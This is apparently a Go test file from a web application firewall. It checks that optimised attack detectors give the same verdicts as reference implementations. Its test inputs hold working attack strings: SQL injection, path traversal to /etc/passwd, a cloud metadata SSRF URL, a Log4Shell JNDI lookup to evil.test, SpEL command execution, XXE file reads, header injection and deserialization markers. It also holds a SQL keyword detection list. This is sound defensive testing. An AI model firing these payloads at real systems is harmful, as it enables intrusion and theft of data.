package owasp

import (
	"strings"
	"sync"
	"testing"

	"My-OpenWaf/internal/ac"
)

// 参考实现使用独立的自动机：原生产的「总表 + 每族自动机」结构已由统合扫描
// 取代（scan_gate.go），此处按原始构建规则（orNeedles 建族表、andLeft/andRight
// 建两臂表、gateOnly 只进总表）重建，作为 scanGate.family 的等价性基准。
var (
	refOnce   sync.Once
	refGlobal *ac.Matcher
	refFam    [famCount]*ac.Matcher
	refAndL   [famCount]*ac.Matcher
	refAndR   [famCount]*ac.Matcher
)

func refInit() {
	refOnce.Do(func() {
		gb := ac.NewBuilder()
		addAll := func(b *ac.Builder, qs []string) {
			for _, q := range qs {
				if q == "" {
					continue
				}
				b.AddPattern(q)
			}
		}
		for fam := int32(0); fam < famCount; fam++ {
			f := &owaspACFamilies[fam]
			addAll(gb, f.orNeedles)
			if len(f.andLeft) > 0 || len(f.andRight) > 0 {
				lb := ac.NewBuilder()
				addAll(lb, f.andLeft)
				refAndL[fam] = lb.Build()
				rb := ac.NewBuilder()
				addAll(rb, f.andRight)
				refAndR[fam] = rb.Build()
				addAll(gb, f.andLeft)
				addAll(gb, f.andRight)
			}
			addAll(gb, f.gateOnly)
			if len(f.orNeedles) > 0 {
				fb := ac.NewBuilder()
				addAll(fb, f.orNeedles)
				refFam[fam] = fb.Build()
			}
		}
		refGlobal = gb.Build()
	})
}

// referenceACIndicator 复刻统合扫描之前的「总表短路 + 族判定」判定序列。
//
// 本函数仅作为等价性基准存在于测试中：一旦将来有人往某族的 gateOnly /
// 兜底分支里加入「不在族自动机内」的条件，本测试会立刻失败。
func referenceACIndicator(fam int32, s string) bool {
	refInit()
	if !refGlobal.MatchAny(s) {
		return false
	}
	switch fam {
	case famXXE:
		if m := refFam[fam]; m != nil && m.MatchAny(s) {
			return true
		}
		return reParamEntityChain.MatchString(s)
	case famDeser:
		if m := refFam[fam]; m != nil && m.MatchAny(s) {
			return true
		}
		return hasPHPSerializedObjectIndicator(s) || hasPHPSerializedStringPairIndicator(s)
	default:
		if m := refFam[fam]; m != nil && m.MatchAny(s) {
			return true
		}
		if refAndL[fam] != nil && refAndR[fam] != nil {
			return refAndL[fam].MatchAny(s) && refAndR[fam].MatchAny(s)
		}
		return false
	}
}

// referenceHasSuspiciousKeywords 复刻改动前的「空格门 + 顺序 Contains」实现，
// 作为 hasSuspiciousKeywords 按首字母分组的等价性基准。
func referenceHasSuspiciousKeywords(s string) bool {
	if s == "" {
		return false
	}
	bm := scanIndicatorMask(s, &referenceSuspKeywordMaskTable)
	if bm&skSP != 0 {
		if strings.Contains(s, "select ") ||
			strings.Contains(s, "union ") ||
			strings.Contains(s, "insert ") ||
			strings.Contains(s, "update ") ||
			strings.Contains(s, "delete ") ||
			strings.Contains(s, "drop ") ||
			strings.Contains(s, " or ") ||
			strings.Contains(s, " and ") ||
			strings.Contains(s, "exec ") ||
			strings.Contains(s, " having ") ||
			strings.Contains(s, "alter ") ||
			strings.Contains(s, " table ") ||
			strings.Contains(s, " from ") ||
			strings.Contains(s, " where ") ||
			strings.Contains(s, " like ") ||
			strings.Contains(s, "sleep ") {
			return true
		}
	}
	if bm&skT != 0 && strings.Contains(s, "truncate") {
		return true
	}
	if bm&skW != 0 && strings.Contains(s, "waitfor") {
		return true
	}
	if bm&skH != 0 && strings.Contains(s, "schema") {
		return true
	}
	if bm&skD != 0 && strings.Contains(s, "database") {
		return true
	}
	if bm&skB != 0 && strings.Contains(s, "benchmark") {
		return true
	}
	return false
}

// referenceSuspKeywordMaskTable 只保留原始实现需要的空格与 t/w/h/d/b 位。
var referenceSuspKeywordMaskTable = buildIndicatorMaskTable(map[string]uint32{
	" ": skSP,
	"t": skT,
	"w": skW,
	"h": skH,
	"d": skD,
	"b": skB,
})

// TestHasSuspiciousKeywordsMatchesReference 覆盖大小写、缺少空格、缺少首字母、
// 多个关键词共存等形态，验证分组短路没有改变任何判定。
func TestHasSuspiciousKeywordsMatchesReference(t *testing.T) {
	payloads := []string{
		"",
		"hello world",
		"SELECT * FROM users",
		"select * from users",
		"1 union select null",
		"1 UNION SELECT NULL",
		"insert into t values(1)",
		"update t set a=1",
		"delete from t",
		"drop table t",
		"1 or 1=1",
		"1 and 1=1",
		"exec xp_cmdshell",
		"having 1=1",
		"alter table t",
		"a table b",
		"a from b",
		"a where b",
		"a like b",
		"sleep 5",
		"sleep(5)",
		"truncate t",
		"waitfor delay",
		"information_schema",
		"database()",
		"benchmark(1000000,md5(1))",
		"selectfrom",
		"an or and exec",
		"query=1&page=2",
		`{"a":"b c d e f g h i l o s t u w"}`,
		"the quick brown fox jumps over the lazy dog",
		"and",
		" or ",
		"or",
	}
	for _, payload := range payloads {
		want := referenceHasSuspiciousKeywords(payload)
		got := hasSuspiciousKeywords(payload)
		if got != want {
			t.Fatalf("hasSuspiciousKeywords(%q) = %v, want %v", payload, got, want)
		}
	}
}

// TestHasACIndicatorMatchesGlobalShortCircuit 验证省去总表扫描后，全部族在
// 良性、编码、攻击载荷上的判定与原始序列逐一致。
func TestHasACIndicatorMatchesGlobalShortCircuit(t *testing.T) {
	payloads := []string{
		"",
		"hello world",
		"/api/v1/users?id=1&page=2",
		`{"name":"alice","email":"a@b.test"}`,
		"location: https://example.test/page",
		"please quit the session",
		"select the plan you like",
		"a\r\nb",
		"../../../etc/passwd",
		"%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"127.0.0.1:6379",
		"http://169.254.169.254/latest/meta-data/",
		")(|(objectClass=*)",
		`{"$where":"1==1"}`,
		"{{7*7}}",
		"${jndi:ldap://evil.test/a}",
		"rO0ABXNy",
		"aced0005",
		"%ac%ed%00%05",
		"${T(java.lang.Runtime).getRuntime().exec('id')}",
		"query { __schema { types { name } } }",
		"x\r\nset-cookie: sid=1",
		"%0d%0alocation: http://evil",
		"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
		"constructor.prototype.__proto__",
		"!!python/object/new:exec",
	}
	for _, payload := range payloads {
		for fam := int32(0); fam < famCount; fam++ {
			want := referenceACIndicator(fam, payload)
			got := hasACIndicator(fam, payload)
			if got != want {
				t.Fatalf("hasACIndicator(fam=%d, %q) = %v, want %v", fam, payload, got, want)
			}
		}
	}
}
